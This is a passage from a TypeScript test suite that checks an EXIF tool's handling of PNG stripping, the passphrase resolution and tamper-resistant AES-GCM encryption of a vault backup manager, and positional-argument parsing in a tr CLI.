      // PNG --strip must exit 1 instead of faking stripped: true
      const pngPath = join(dir, "img.png");
      writeFileSync(
        pngPath,
        Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
      );
      const pngStripProc = Bun.spawnSync(
        [
          process.execPath,
          "run",
          resolve("cli_apps/exif_cli.ts"),
          "-f",
          pngPath,
          "--strip",
          "--json",
        ],
        { stdout: "pipe", stderr: "pipe" },
      );
      expect(pngStripProc.exitCode).toBe(1);

      // 7. vault_backup_manager authenticated AES-256-GCM & env key resolution
      const keyInfo = await resolveVaultPassphrase({
        env: { VAULT_BACKUP_KEY: "env-passphrase-123" },
      });
      expect(keyInfo.passphrase).toBe("env-passphrase-123");
      expect(keyInfo.usedCliArg).toBe(false);

      const secretData = Buffer.from(
        "confidential vault archive bytes",
        "utf8",
      );
      const encrypted = encryptVaultPayload(secretData, keyInfo.passphrase);
      expect(encrypted.includes(secretData)).toBe(false);
      expect(
        decryptVaultPayload(encrypted, keyInfo.passphrase).equals(secretData),
      ).toBe(true);
      expect(() =>
        decryptVaultPayload(encrypted, "wrong-passphrase"),
      ).toThrow();
      const tampered = Buffer.from(encrypted);
      const lastIdx = tampered.length - 1;
      tampered[lastIdx] = (tampered[lastIdx] ?? 0) ^ 0xff;
      expect(() => decryptVaultPayload(tampered, keyInfo.passphrase)).toThrow();

      // 8. CLI flag default-shadowing fix verification (tr_cli positional arg works!)
      const trProc = Bun.spawnSync(
        [
          process.execPath,
          "run",
          resolve("cli_apps/tr_cli.ts"),
          "CustomPositional",
        ],
        { stdout: "pipe", stderr: "pipe" },
      );
      expect(trProc.exitCode).toBe(0);
      expect(trProc.stdout.toString("utf8")).toContain("CUSTOMPOSITIONAL");
    });
  });
});
